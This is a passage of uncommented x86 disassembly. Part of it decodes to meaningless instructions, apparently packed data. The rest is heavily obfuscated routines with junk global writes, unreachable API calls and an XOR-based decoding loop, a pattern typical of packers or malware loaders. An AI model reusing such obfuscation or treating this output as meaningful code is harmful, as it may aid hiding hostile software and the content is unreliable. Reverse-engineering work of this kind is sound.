  40f2cd:	push   edx
  40f2ce:	ja     0x40f2cb
  40f2d0:	cmp    DWORD PTR [esi+eiz*8-0x6],0x2f8894e9
  40f2d8:	icebp  
  40f2d9:	pop    edi
  40f2da:	sub    al,0xae
  40f2dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2dd:	xchg   esi,eax
  40f2de:	aad    0x34
  40f2e0:	test   eax,0x8158c6ee
  40f2e5:	ror    BYTE PTR [eax],1
  40f2e7:	in     eax,0x7e
  40f2e9:	xchg   edi,eax
  40f2ea:	add    dh,al
  40f2ec:	out    0xf9,al
  40f2ee:	dec    eax
  40f2ef:	notrack jmp DWORD PTR [ebp+esi*2+0x393ded3f]
  40f2f7:	mov    ebx,0x1d0f7e7d
  40f2fc:	int3   
  40f2fd:	push   edi
  40f2fe:	mov    al,ds:0x3ff70ad6
  40f303:	es clc 
  40f305:	sbb    BYTE PTR [ebx],dl
  40f307:	inc    ecx
  40f308:	ret    
  40f309:	test   eax,0xc2ab8e19
  40f30e:	repz fimul DWORD PTR [esi+0xe0e46b8]
  40f315:	mov    eax,ds:0xe1591796
  40f31a:	xchg   esi,eax
  40f31b:	xor    eax,DWORD PTR [bx+di-0x1e]
  40f31f:	xor    DWORD PTR [esi],edx
  40f321:	outs   dx,DWORD PTR ds:[esi]
  40f322:	sbb    al,0xf2
  40f324:	addr16 mov al,fs:0xb1df
  40f329:	jns    0x40f2d5
  40f32b:	jmp    0x1ffbe178
  40f330:	sub    DWORD PTR [edx-0x17f05c06],esp
  40f336:	adc    DWORD PTR [eax-0x47],ebx
  40f339:	and    edi,DWORD PTR [esp]
  40f33c:	xchg   BYTE PTR [edx-0xe111571],ch
  40f342:	dec    edx
  40f343:	sub    esi,DWORD PTR [ecx+0x1]
  40f346:	pmulhw mm5,mm0
  40f349:	mov    esp,0x265cb2c7
  40f34e:	lods   al,BYTE PTR ds:[esi]
  40f34f:	mov    ds,edi
  40f351:	pop    esp
  40f352:	push   es
  40f353:	sub    BYTE PTR [ebp+0x667c83a],dl
  40f359:	mov    esi,0xd801f46d
  40f35e:	jle    0x40f390
  40f360:	loope  0x40f2e9
  40f362:	mov    eax,0x119acdbd
  40f367:	mov    BYTE PTR [edx],dl
  40f369:	adc    eax,0xd33c1d8e
  40f36e:	add    eax,0x5c5b0b54
  40f373:	add    DWORD PTR [ebx],eax
  40f375:	pop    ebp
  40f376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f377:	jb     0x40f3dc
  40f379:	push   ds
  40f37a:	test   DWORD PTR [eax],edx
  40f37c:	cmp    dl,cl
  40f37e:	xor    edi,0xd7aa5ae2
  40f384:	pusha  
  40f385:	and    ah,bh
  40f387:	neg    DWORD PTR [eax]
  40f389:	xchg   BYTE PTR [ecx],dl
  40f38b:	out    0x43,al
  40f38d:	das    
  40f38e:	fadd   st(1),st
  40f390:	xor    al,0xcd
  40f392:	mov    esi,0x22875d9e
  40f397:	pop    esi
  40f398:	jge    0x40f3cc
  40f39a:	mov    eax,0xcfd917f2
  40f39f:	rcr    DWORD PTR [ebx+0x8],0x22
  40f3a3:	cs fs jg 0x40f3b1
  40f3a7:	jecxz  0x40f3a9
  40f3a9:	and    cl,bh
  40f3ab:	jg     0x40f358
  40f3ad:	xchg   edx,eax
  40f3ae:	lods   al,BYTE PTR ds:[esi]
  40f3af:	sub    DWORD PTR [ebx-0x37],ebx
  40f3b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3b3:	cs dec ebx
  40f3b5:	fist   DWORD PTR [edx-0x6d552d42]
  40f3bb:	xchg   esp,eax
  40f3bc:	sbb    dh,bl
  40f3be:	test   al,cl
  40f3c0:	es push 0xf76f96b0
  40f3c6:	mov    dl,0xd8
  40f3c8:	jmp    0x40f405
  40f3ca:	adc    al,0x5e
  40f3cc:	addr16 jg 0x40f43d
  40f3cf:	fs xchg esi,eax
  40f3d1:	cmp    al,0x7c
  40f3d3:	adc    al,0x82
  40f3d5:	jmp    0x40f44d
  40f3d7:	or     esi,ebp
  40f3d9:	mov    dl,0x48
  40f3db:	fnstsw WORD PTR [bx]
  40f3de:	std    
  40f3df:	call   DWORD PTR [ebx]
  40f3e1:	mov    dl,0x25
  40f3e3:	ds ins DWORD PTR es:[edi],dx
  40f3e5:	out    0xfb,eax
  40f3e7:	inc    eax
  40f3e8:	outs   dx,DWORD PTR ds:[esi]
  40f3e9:	sbb    DWORD PTR [ebx+0x64],0xffffffbe
  40f3ed:	xchg   ecx,eax
  40f3ee:	out    dx,eax
  40f3ef:	push   ebp
  40f3f0:	call   0x94b6:0xacf8156a
  40f3f7:	jmp    0x40f453
  40f3f9:	cmp    DWORD PTR [ecx],ebx
  40f3fb:	fist   DWORD PTR [esi+0x574b8847]
  40f401:	and    ebx,ebp
  40f403:	cs jnp 0x40f418
  40f406:	(bad)  
  40f407:	jne    0x40f411
  40f409:	dec    ebp
  40f40a:	mov    edx,0xd6f4ef0a
  40f40f:	or     DWORD PTR [edx+0x4c2672e3],ebx
  40f415:	cs mov edx,es
  40f418:	and    DWORD PTR [ebx-0x8],edi
  40f41b:	sbb    DWORD PTR [ebp-0x583fd5b1],eax
  40f421:	enter  0xd520,0x5f
  40f425:	dec    esi
  40f426:	jp     0x40f498
  40f428:	inc    ecx
  40f429:	mov    ecx,DWORD PTR [esp+edi*2-0x47]
  40f42d:	cli    
  40f42e:	(bad)  
  40f430:	(bad)  
  40f431:	pop    esi
  40f432:	in     eax,0x21
  40f434:	xchg   edi,eax
  40f435:	pop    edi
  40f436:	vmwrite esp,DWORD PTR [edx+0x7fd6cbf]
  40f43d:	jmp    0x40f3e3
  40f43f:	(bad)  
  40f440:	jnp    0x40f4a3
  40f442:	lahf   
  40f443:	ins    DWORD PTR es:[edi],dx
  40f444:	xchg   esp,eax
  40f445:	sub    eax,0x94d11213
  40f44a:	mov    ds:0x1eab0cd9,eax
  40f44f:	mov    esp,0x3a47785b
  40f454:	mov    cl,0x2d
  40f456:	xchg   edi,eax
  40f457:	push   ds
  40f458:	test   bh,ah
  40f45a:	daa    
  40f45b:	dec    eax
  40f45c:	(bad)  
  40f45d:	es inc edx
  40f45f:	and    ecx,ebx
  40f461:	fs stos DWORD PTR es:[edi],eax
  40f463:	sbb    ebx,ebp
  40f465:	mov    ah,0x88
  40f467:	cld    
  40f468:	cld    
  40f469:	stos   DWORD PTR es:[edi],eax
  40f46a:	xor    BYTE PTR [esi],bl
  40f46c:	xchg   ebp,eax
  40f46d:	dec    eax
  40f46e:	popa   
  40f46f:	sahf   
  40f470:	aad    0xe2
  40f472:	stc    
  40f473:	mov    dl,0x23
  40f475:	mov    dh,0x7a
  40f477:	jns    0x40f4df
  40f479:	push   edi
  40f47a:	or     dl,BYTE PTR [bx+0x1f0a]
  40f47f:	fnstcw WORD PTR [eax-0xa3d9de]
  40f485:	in     eax,dx
  40f486:	scas   eax,DWORD PTR es:[edi]
  40f487:	pusha  
  40f488:	adc    eax,0x477f0635
  40f48e:	adc    al,0xe0
  40f490:	or     al,0x45
  40f492:	inc    ebp
  40f493:	inc    esi
  40f494:	popa   
  40f495:	adc    DWORD PTR [ebp+0x36],ebx
  40f498:	in     eax,0xa2
  40f49a:	js     0x40f4b3
  40f49c:	push   edi
  40f49d:	icebp  
  40f49e:	mov    al,0xdc
  40f4a0:	fs add eax,0xf207109a
  40f4a6:	or     bh,BYTE PTR [edi-0x63]
  40f4a9:	fidiv  DWORD PTR [edx]
  40f4ab:	stos   DWORD PTR es:[edi],eax
  40f4ac:	cmp    BYTE PTR [edi+0x72],ah
  40f4af:	aas    
  40f4b0:	mov    WORD PTR [esi+0x4],ds
  40f4b3:	mov    bh,0xc4
  40f4b5:	(bad)  
  40f4b6:	adc    bh,dl
  40f4b8:	jns    0x40f4ee
  40f4ba:	cli    
  40f4bb:	pop    edi
  40f4bc:	gs dec esi
  40f4be:	mov    dl,0xb4
  40f4c0:	mov    BYTE PTR [esi-0x6b],bh
  40f4c3:	xchg   edx,eax
  40f4c4:	jl     0x40f481
  40f4c6:	retf   0x3d96
  40f4c9:	sub    al,0x36
  40f4cb:	js     0x40f50a
  40f4cd:	xor    DWORD PTR [ecx+0x6118fc8b],0x6d536bad
  40f4d7:	ja     0x40f4cd
  40f4d9:	retf   0xc9c5
  40f4dc:	sti    
  40f4dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4de:	push   ebx
  40f4df:	std    
  40f4e0:	leave  
  40f4e1:	xor    BYTE PTR [edi],bl
  40f4e3:	inc    ebp
  40f4e4:	int    0xd9
  40f4e6:	sub    eax,0x25a2596b
  40f4eb:	xor    eax,0xbe6a0bfd
  40f4f0:	in     al,dx
  40f4f1:	fisub  DWORD PTR [esi-0x59f83efb]
  40f4f7:	ds stos BYTE PTR es:[edi],al
  40f4f9:	cmp    eax,0x881b9486
  40f4fe:	addr16 sbb esp,eax
  40f501:	sbb    ecx,DWORD PTR [edx-0x3b34ffb9]
  40f507:	push   0x2bd29f12
  40f50c:	mov    ds:0xac7ab784,eax
  40f511:	sahf   
  40f512:	in     eax,dx
  40f513:	xor    al,0x61
  40f515:	mov    ebx,0x66d9fa3d
  40f51a:	loop   0x40f556
  40f51c:	xor    al,0x85
  40f51e:	push   ebx
  40f51f:	loope  0x40f528
  40f521:	es test al,0x64
  40f524:	test   eax,0xb96094e8
  40f529:	jno    0x40f568
  40f52b:	dec    edi
  40f52c:	or     DWORD PTR [ebp+0x1a3914b2],eax
  40f532:	pop    edx
  40f533:	xchg   ebx,eax
  40f534:	imul   ecx,DWORD PTR [ebp+edi*2+0x6e],0x19e54370
  40f53c:	inc    ecx
  40f53d:	push   eax
  40f53e:	pop    esp
  40f53f:	pushf  
  40f540:	les    edx,FWORD PTR [esi-0x8d75e97]
  40f546:	fisttp QWORD PTR [esp+ebx*8-0x2a]
  40f54a:	cdq    
  40f54b:	and    al,0xa1
  40f54d:	les    edx,FWORD PTR [eax+0xa]
  40f550:	outs   dx,BYTE PTR ds:[esi]
  40f551:	retf   0x77de
  40f554:	push   ecx
  40f555:	loop   0x40f584
  40f557:	inc    esi
  40f558:	or     al,0x65
  40f55a:	jp     0x40f52e
  40f55c:	mov    dl,BYTE PTR [ebx+0x7b1da981]
  40f562:	outs   dx,BYTE PTR ds:[esi]
  40f563:	mov    cl,dh
  40f565:	test   al,0x66
  40f567:	(bad)
  40f56b:	int    0xbe
  40f56d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f56e:	mov    ds:0xcd318b26,al
  40f573:	inc    edx
  40f574:	mov    ch,0x88
  40f576:	fist   DWORD PTR [ebx]
  40f578:	leave  
  40f579:	pop    esp
  40f57a:	call   0x2e11:0xa903d72
  40f581:	pop    edx
  40f582:	sub    al,0x38
  40f584:	jl     0x40f546
  40f586:	push   esp
  40f587:	test   DWORD PTR [esi],0x276c66b0
  40f58d:	pop    edi
  40f58e:	in     eax,dx
  40f58f:	inc    eax
  40f590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f591:	gs jp  0x40f5bb
  40f594:	call   0xe57b:0x7f317128
  40f59b:	xchg   ebp,eax
  40f59c:	dec    edx
  40f59d:	fadd   QWORD PTR [eax-0x1847d62c]
  40f5a3:	mov    bl,0x6c
  40f5a5:	rol    DWORD PTR [eax+0x3747c29f],cl
  40f5ab:	pop    ebp
  40f5ac:	mov    al,ds:0x80f303ec
  40f5b1:	jo     0x40f543
  40f5b3:	mov    ds:0x3c738069,eax
  40f5b8:	gs jo  0x40f588
  40f5bb:	sub    esi,esp
  40f5bd:	jbe    0x40f5f5
  40f5bf:	xor    dl,dh
  40f5c1:	mov    ebx,0xe785c379
  40f5c6:	xor    eax,0xbf523c0b
  40f5cb:	inc    esi
  40f5cc:	xchg   ebx,eax
  40f5ce:	push   esi
  40f5cf:	lea    esp,[esi]
  40f5d1:	cli    
  40f5d2:	imul   ecx,DWORD PTR [ebx+0x46927a99],0x625127e9
  40f5dc:	lahf   
  40f5dd:	adc    DWORD PTR [eax+0x20],0xccb52738
  40f5e4:	push   ds
  40f5e5:	dec    edx
  40f5e6:	pop    esi
  40f5e7:	ja     0x40f60e
  40f5e9:	xchg   DWORD PTR [edi+0x4e],edx
  40f5ec:	les    esp,FWORD PTR [eax]
  40f5ee:	pop    edx
  40f5ef:	push   0x75
  40f5f1:	mov    ebp,0xd8cffbae
  40f5f6:	jnp    0x40f57c
  40f5f8:	sahf   
  40f5f9:	xlat   BYTE PTR ds:[ebx]
  40f5fa:	jno    0x40f660
  40f5fc:	in     al,dx
  40f5fd:	mov    al,ds:0xc5fdb1d8
  40f602:	push   es
  40f603:	std    
  40f604:	fs xchg edi,eax
  40f606:	test   dl,ah
  40f608:	push   0xffffffa9
  40f60a:	outs   dx,DWORD PTR ds:[esi]
  40f60b:	es jmp 0x734fc7d8
  40f611:	and    al,0x16
  40f613:	jge    0x40f63e
  40f615:	mov    dh,BYTE PTR [ebx]
  40f617:	mov    ebx,0x31a1a66d
  40f61c:	or     al,0x53
  40f61e:	cmp    bl,dh
  40f620:	dec    ecx
  40f621:	inc    edx
  40f622:	arpl   WORD PTR [edx],sp
  40f624:	mov    esp,0xb6e22ed1
  40f629:	daa    
  40f62a:	imul   DWORD PTR [ecx]
  40f62c:	addr16 xabort 0xa8
  40f630:	sti    
  40f631:	xchg   edx,ebx
  40f633:	or     al,0x50
  40f635:	in     eax,0x7
  40f637:	xchg   ebx,esi
  40f639:	xor    ebx,ebx
  40f63b:	push   esi
  40f63c:	mov    esi,ebx
  40f63e:	pop    ebx
  40f63f:	mov    edx,esi
  40f641:	add    ebx,0x1002
  40f647:	lea    eax,[ebp-0x18]
  40f64a:	add    edx,eax
  40f64c:	add    edx,0x5
  40f64f:	push   edx
  40f650:	inc    esi
  40f651:	pop    ecx
  40f652:	dec    ecx
  40f653:	xchg   ecx,eax
  40f654:	dec    eax
  40f655:	xchg   ecx,eax
  40f656:	dec    ecx
  40f657:	xchg   ecx,edx
  40f659:	dec    edx
  40f65a:	push   edx
  40f65b:	mov    edx,ebx
  40f65d:	pop    ebx
  40f65e:	dec    ebx
  40f65f:	call   DWORD PTR [ebx]
  40f661:	cmp    DWORD PTR [ebp+0x10],esi
  40f664:	je     0x40f685
  40f66a:	xchg   edx,eax
  40f66b:	push   0xc
  40f66d:	pop    ecx
  40f66e:	dec    ecx
  40f66f:	push   0x3
  40f671:	pop    ebx
  40f672:	inc    ebx
  40f673:	xchg   ebx,ecx
  40f675:	inc    ecx
  40f676:	sub    ebx,ecx
  40f678:	xchg   ebx,ecx
  40f67a:	dec    ecx
  40f67b:	dec    ecx
  40f67c:	mov    eax,DWORD PTR [ebp-0x1c]
  40f67f:	imul   eax,ecx
  40f682:	add    esp,eax
  40f684:	xchg   edx,eax
  40f685:	push   eax
  40f686:	xor    ebx,ebx
  40f688:	mov    edx,esp
  40f68a:	dec    edx
  40f68b:	inc    ebx
  40f68c:	add    ebx,DWORD PTR [edx+ebx*1]
  40f68f:	dec    ebx
  40f690:	xor    edx,edx
  40f692:	add    DWORD PTR [ebp-0x10],ebx
  40f695:	pop    ebx
  40f696:	mov    eax,DWORD PTR [ebp-0x10]
  40f699:	pop    edi
  40f69a:	pop    esi
  40f69b:	pop    ebx
  40f69c:	leave  
  40f69d:	ret    0x10
  40f6a0:	push   ebp
  40f6a1:	mov    ebp,esp
  40f6a3:	push   ecx
  40f6a4:	mov    DWORD PTR [ebp-0x4],0xf89c85bd
  40f6ab:	xor    DWORD PTR ds:0x428eb1,0x6807
  40f6b5:	mov    eax,DWORD PTR [ebp-0x4]
  40f6b8:	mov    edx,DWORD PTR [ebp+0x10]
  40f6bb:	mov    ecx,0x75108b1
  40f6c0:	xor    eax,ecx
  40f6c2:	add    eax,0x3272f8
  40f6c7:	mov    DWORD PTR [edx],eax
  40f6c9:	mov    eax,DWORD PTR [ebp+0xc]
  40f6cc:	xor    eax,ecx
  40f6ce:	or     DWORD PTR ds:0x428e95,0x4274
  40f6d8:	push   esi
  40f6d9:	xor    edx,DWORD PTR ds:0x428e25
  40f6df:	mov    esi,DWORD PTR [ebp+0x10]
  40f6e2:	mov    edx,0x3272f8
  40f6e7:	sub    DWORD PTR ds:0x428e35,0x428e89
  40f6f1:	add    eax,edx
  40f6f3:	mov    DWORD PTR [esi+0x4],eax
  40f6f6:	mov    eax,DWORD PTR [ebp+0x14]
  40f6f9:	sub    DWORD PTR ds:0x428e6d,0x71ec
  40f703:	mov    esi,DWORD PTR [ebp+0x10]
  40f706:	xor    DWORD PTR ds:0x428e75,0xbd4
  40f710:	mov    DWORD PTR [esi+0x8],eax
  40f713:	mov    eax,DWORD PTR [ebp+0x18]
  40f716:	mov    esi,DWORD PTR [ebp+0x10]
  40f719:	sub    DWORD PTR ds:0x428e31,0x4173
  40f723:	mov    DWORD PTR [esi+0xc],eax
  40f726:	add    esi,0x59ec
  40f72c:	mov    eax,DWORD PTR [ebp+0x1c]
  40f72f:	mov    esi,DWORD PTR [ebp+0x10]
  40f732:	mov    DWORD PTR [esi+0x10],eax
  40f735:	mov    eax,DWORD PTR [ebp+0x8]
  40f738:	xor    eax,ecx
  40f73a:	add    eax,edx
  40f73c:	pop    esi
  40f73d:	leave  
  40f73e:	ret    0x18
  40f741:	push   ebp
  40f742:	mov    ebp,esp
  40f744:	sub    esp,0x9c
  40f74a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f74d:	sbb    DWORD PTR ds:0x428e9d,edx
  40f753:	mov    eax,0x8a9c
  40f758:	sbb    DWORD PTR ds:0x428ed1,0x428ec1
  40f762:	xor    ax,WORD PTR [ecx+0x20]
  40f766:	and    DWORD PTR ds:0x428e65,ebx
  40f76c:	mov    ecx,0x3b5e
  40f771:	add    ax,cx
  40f774:	movzx  eax,ax
  40f777:	xor    ecx,DWORD PTR ds:0x428e89
  40f77d:	mov    DWORD PTR [ebp-0x10],eax
  40f780:	mov    BYTE PTR [ebp-0x1],0x7c
  40f784:	and    DWORD PTR ds:0x428e9d,0x0
  40f78e:	mov    ecx,DWORD PTR ds:0x428e9d
  40f794:	inc    ecx
  40f795:	mov    DWORD PTR ds:0x428e9d,ecx
  40f79b:	cmp    DWORD PTR ds:0x428e9d,0x25
  40f7a2:	ja     0x40f7ce
  40f7a8:	jmp    0x40f7c1
  40f7ad:	push   0x762d
  40f7b2:	push   DWORD PTR [ebp-0x1c]
  40f7b5:	push   DWORD PTR [ebp-0x10]
  40f7b8:	push   DWORD PTR [ebp-0x1c]
  40f7bb:	call   DWORD PTR ds:0x42ca3c
  40f7c1:	cmp    DWORD PTR ds:0x428e9d,0x1d
  40f7c8:	jb     0x40f78e
  40f7ce:	lea    eax,[ebp-0x1]
  40f7d1:	mov    DWORD PTR [ebp-0xc],eax
  40f7d4:	mov    DWORD PTR ds:0x428e65,0x1c
  40f7de:	cmp    DWORD PTR ds:0x428e65,0x0
  40f7e5:	je     0x40f82d
  40f7eb:	cmp    DWORD PTR ds:0x428e65,0x22
  40f7f2:	jle    0x40f82d
  40f7f8:	jmp    0x40f819
  40f7fd:	push   0x5d70
  40f802:	push   DWORD PTR [ebp-0x24]
  40f805:	push   DWORD PTR [ebp-0x20]
  40f808:	push   DWORD PTR [ebp-0x28]
  40f80b:	push   0x428104
  40f810:	push   DWORD PTR [ebp-0x24]
  40f813:	call   DWORD PTR ds:0x42ca10
  40f819:	xor    ecx,ecx
  40f81b:	or     ecx,DWORD PTR ds:0x428e65
  40f821:	dec    ecx
  40f822:	mov    DWORD PTR ds:0x428e65,ecx
  40f828:	jmp    0x40f7de
  40f82d:	mov    al,BYTE PTR [ebp-0x1]
  40f830:	add    DWORD PTR ds:0x428e95,edi
  40f836:	mov    ecx,DWORD PTR [ebp-0xc]
  40f839:	xor    al,0x80
  40f83b:	sub    DWORD PTR ds:0x428ebd,0x428e99
  40f845:	add    al,0x5
  40f847:	sbb    DWORD PTR ds:0x428e29,0x428ead
  40f851:	mov    BYTE PTR [ecx],al
  40f853:	mov    DWORD PTR ds:0x428eb1,0x18
  40f85d:	cmp    DWORD PTR ds:0x428eb1,0x0
  40f864:	je     0x40f8ba
  40f86a:	cmp    DWORD PTR ds:0x428eb1,0xc
  40f871:	jl     0x40f8ba
  40f877:	jmp    0x40f88c
  40f87c:	push   0x428009
  40f881:	push   DWORD PTR [ebp-0x28]
  40f884:	push   0x0
  40f886:	call   DWORD PTR ds:0x42ca4c
  40f88c:	cmp    DWORD PTR ds:0x428eb1,0xd
  40f893:	jne    0x40f8a6
  40f899:	mov    ecx,DWORD PTR ds:0x428eb1
  40f89f:	dec    ecx
  40f8a0:	mov    DWORD PTR ds:0x428eb1,ecx
  40f8a6:	xor    ecx,ecx
  40f8a8:	add    ecx,DWORD PTR ds:0x428eb1
  40f8ae:	dec    ecx
  40f8af:	mov    DWORD PTR ds:0x428eb1,ecx
  40f8b5:	jmp    0x40f85d
  40f8ba:	mov    DWORD PTR [ebp-0x18],0xf89c85b9
  40f8c1:	push   ebx
  40f8c2:	mov    DWORD PTR ds:0x428e59,0x10
  40f8cc:	cmp    DWORD PTR ds:0x428e59,0x0
  40f8d3:	je     0x40f909
  40f8d9:	cmp    DWORD PTR ds:0x428e59,0x12
  40f8e0:	jg     0x40f909
  40f8e6:	jmp    0x40f8f6
  40f8eb:	push   0x21fb
  40f8f0:	call   DWORD PTR ds:0x42ca50
  40f8f6:	xor    eax,eax
  40f8f8:	or     eax,DWORD PTR ds:0x428e59
  40f8fe:	dec    eax
  40f8ff:	mov    ds:0x428e59,eax
  40f904:	jmp    0x40f8cc
  40f909:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  40f910:	mov    ecx,DWORD PTR [ebp-0x18]
  40f913:	push   esi
  40f914:	mov    eax,0x75108b1
  40f919:	and    DWORD PTR ds:0x428e8d,0x6e27
  40f923:	xor    ecx,eax
  40f925:	or     esi,DWORD PTR ds:0x428e41
  40f92b:	mov    esi,0x3272f8
  40f930:	sbb    DWORD PTR ds:0x428e65,0x3911
  40f93a:	push   edi
  40f93b:	add    ecx,esi
  40f93d:	jmp    0x40f957
  40f942:	mov    dl,BYTE PTR [ebp-0x1]
  40f945:	mov    DWORD PTR ds:0x428ea5,0x4ad2
  40f94f:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40f956:	inc    ecx
  40f957:	cmp    ecx,0x40
  40f95a:	mov    DWORD PTR ds:0x428ec9,0x10ec
  40f964:	jb     0x40f942
  40f96a:	not    edx
  40f96c:	mov    edx,DWORD PTR [ebp-0x18]
  40f96f:	or     DWORD PTR ds:0x428e95,0x5092
  40f979:	xor    edx,eax
  40f97b:	sbb    DWORD PTR ds:0x428e7d,0x7f40
  40f985:	add    edx,esi
  40f987:	mov    DWORD PTR ds:0x428e35,0x3958
  40f991:	jmp    0x40fa14
  40f996:	sbb    ecx,DWORD PTR ds:0x428e6d
  40f99c:	mov    edi,DWORD PTR [ebp+0x8]
  40f99f:	sub    DWORD PTR ds:0x428e2d,0x7feb
  40f9a9:	mov    ecx,0x8a9c
  40f9ae:	sbb    DWORD PTR ds:0x428e25,0x428e91
  40f9b8:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40f9bd:	or     DWORD PTR ds:0x428e2d,0x498b
  40f9c7:	mov    edi,0x3b5e
  40f9cc:	or     DWORD PTR ds:0x428e49,0x428e35
  40f9d6:	add    cx,di
  40f9d9:	movzx  ecx,cx
  40f9dc:	mov    DWORD PTR [ebp-0xc],ecx
  40f9df:	and    DWORD PTR ds:0x428ec9,ecx
  40f9e5:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9e8:	movzx  ecx,WORD PTR [ecx+edx*4]
  40f9ec:	add    DWORD PTR ds:0x428e71,0x1e66
  40f9f6:	xor    ecx,0x8a9c
  40f9fc:	add    ecx,edi
  40f9fe:	inc    edi
  40f9ff:	mov    edi,DWORD PTR [ebp-0xc]
  40fa02:	mov    DWORD PTR ds:0x428e49,0x2418
  40fa0c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40fa13:	inc    edx
  40fa14:	mov    DWORD PTR ds:0x428e81,ecx
  40fa1a:	mov    ecx,DWORD PTR [ebp-0x10]
  40fa1d:	mov    DWORD PTR ds:0x428e61,0x6126
  40fa27:	cmp    edx,ecx
  40fa29:	jne    0x40f996
  40fa2f:	mov    ecx,DWORD PTR [ebp-0x18]
  40fa32:	and    DWORD PTR ds:0x428ec9,0x0
  40fa3c:	jmp    0x40fa50
  40fa41:	xor    edi,edi
  40fa43:	or     edi,DWORD PTR ds:0x428ec9
  40fa49:	inc    edi
  40fa4a:	mov    DWORD PTR ds:0x428ec9,edi
  40fa50:	cmp    DWORD PTR ds:0x428ec9,0x19
  40fa57:	jae    0x40fa87
  40fa5d:	cmp    DWORD PTR ds:0x428ec9,0x28
  40fa64:	jbe    0x40fa87
  40fa6a:	jmp    0x40fa82
  40fa6f:	push   DWORD PTR [ebp-0x20]
  40fa72:	push   0x428104
  40fa77:	push   0x428eb9
  40fa7c:	call   DWORD PTR ds:0x42ca54
  40fa82:	jmp    0x40fa41
  40fa87:	mov    edx,DWORD PTR [ebp+0x10]
  40fa8a:	mov    edi,DWORD PTR ds:0x428e55
  40fa90:	sub    DWORD PTR ds:0x428e75,edi
  40fa96:	xor    ecx,eax
  40fa98:	add    ecx,esi
  40fa9a:	neg    edi
  40fa9c:	mov    DWORD PTR [edx],ecx
  40fa9e:	and    DWORD PTR ds:0x428e49,0x0
  40faa8:	jmp    0x40faba
  40faad:	mov    ecx,DWORD PTR ds:0x428e49
  40fab3:	inc    ecx
  40fab4:	mov    DWORD PTR ds:0x428e49,ecx
  40faba:	cmp    DWORD PTR ds:0x428e49,0x1d
  40fac1:	jae    0x40faf7
  40fac7:	cmp    DWORD PTR ds:0x428e49,0x21
  40face:	jb     0x40faf7
  40fad4:	jmp    0x40faf2
  40fad9:	push   DWORD PTR [ebp-0x14]
  40fadc:	push   DWORD PTR [ebp-0x28]
  40fadf:	push   0x4b8c
  40fae4:	push   DWORD PTR [ebp-0x18]
  40fae7:	push   0x428e9d
  40faec:	call   DWORD PTR ds:0x42ca14
  40faf2:	jmp    0x40faad
  40faf7:	mov    ecx,DWORD PTR [ebp-0x18]
  40fafa:	xor    ecx,eax
  40fafc:	add    ecx,esi
  40fafe:	neg    edi
  40fb00:	mov    DWORD PTR [ebp-0xc],ecx
  40fb03:	or     DWORD PTR ds:0x428e59,edx
  40fb09:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  40fb10:	movzx  edi,BYTE PTR ds:0x428e35
  40fb17:	or     edi,DWORD PTR ds:0x428ec5
  40fb1d:	mov    DWORD PTR ds:0x428e35,edi
  40fb23:	mov    DWORD PTR [ebp-0x14],0xf89c85a9
  40fb2a:	and    DWORD PTR ds:0x428e81,0x0
  40fb34:	jmp    0x40fb46
  40fb39:	mov    ecx,DWORD PTR ds:0x428e81
  40fb3f:	inc    ecx
  40fb40:	mov    DWORD PTR ds:0x428e81,ecx
  40fb46:	cmp    DWORD PTR ds:0x428e81,0x1b
  40fb4d:	jae    0x40fb94
  40fb53:	cmp    DWORD PTR ds:0x428e81,0xa
  40fb5a:	jbe    0x40fb94
  40fb60:	jmp    0x40fb75
  40fb65:	push   0x3736
  40fb6a:	push   0x7077
  40fb6f:	call   DWORD PTR ds:0x42ca18
  40fb75:	cmp    DWORD PTR ds:0x428e81,0x9
  40fb7c:	jne    0x40fb8f
  40fb82:	mov    ecx,DWORD PTR ds:0x428e81
  40fb88:	inc    ecx
  40fb89:	mov    DWORD PTR ds:0x428e81,ecx
  40fb8f:	jmp    0x40fb39
  40fb94:	mov    DWORD PTR [ebp-0x10],0xf89c95b9
  40fb9b:	and    DWORD PTR ds:0x428e35,0x0
  40fba5:	jmp    0x40fbb7
  40fbaa:	mov    ecx,DWORD PTR ds:0x428e35
  40fbb0:	inc    ecx
  40fbb1:	mov    DWORD PTR ds:0x428e35,ecx
  40fbb7:	cmp    DWORD PTR ds:0x428e35,0x11
  40fbbe:	jae    0x40fc0b
  40fbc4:	cmp    DWORD PTR ds:0x428e35,0x5
  40fbcb:	jge    0x40fc0b
  40fbd1:	jmp    0x40fbec
  40fbd6:	push   DWORD PTR [ebp-0xc]
  40fbd9:	push   DWORD PTR [ebp-0x18]
  40fbdc:	push   0x1f27
  40fbe1:	push   0x4d22
  40fbe6:	call   DWORD PTR ds:0x42ca58
  40fbec:	cmp    DWORD PTR ds:0x428e35,0x4
  40fbf3:	jne    0x40fc06
  40fbf9:	mov    ecx,DWORD PTR ds:0x428e35
  40fbff:	inc    ecx
  40fc00:	mov    DWORD PTR ds:0x428e35,ecx
  40fc06:	jmp    0x40fbaa
  40fc0b:	mov    ecx,DWORD PTR [ebp-0x14]
  40fc0e:	xor    edi,edi
  40fc10:	add    edi,DWORD PTR ds:0x428e95
  40fc16:	xor    DWORD PTR ds:0x428e41,edi
  40fc1c:	mov    DWORD PTR [ebp+0x8],ecx
  40fc1f:	adc    DWORD PTR ds:0x428e31,ebx
  40fc25:	mov    ecx,DWORD PTR [ebp+0x8]
  40fc28:	adc    DWORD PTR ds:0x428e39,0x50fd
  40fc32:	xor    ecx,eax
  40fc34:	or     DWORD PTR ds:0x428e49,0x428e31
  40fc3e:	add    ecx,esi
  40fc40:	mov    ecx,0xf641bea
  40fc45:	mov    edi,0x15c3
  40fc4a:	mov    edi,0x5a1eade
  40fc4f:	je     0x412616
  40fc55:	add    edx,ebx
  40fc57:	mov    edx,DWORD PTR [ebp+0x8]
  40fc5a:	and    DWORD PTR ds:0x428eb5,0x428e6d
  40fc64:	mov    ebx,DWORD PTR [ebp-0x8]
  40fc67:	xor    edx,eax
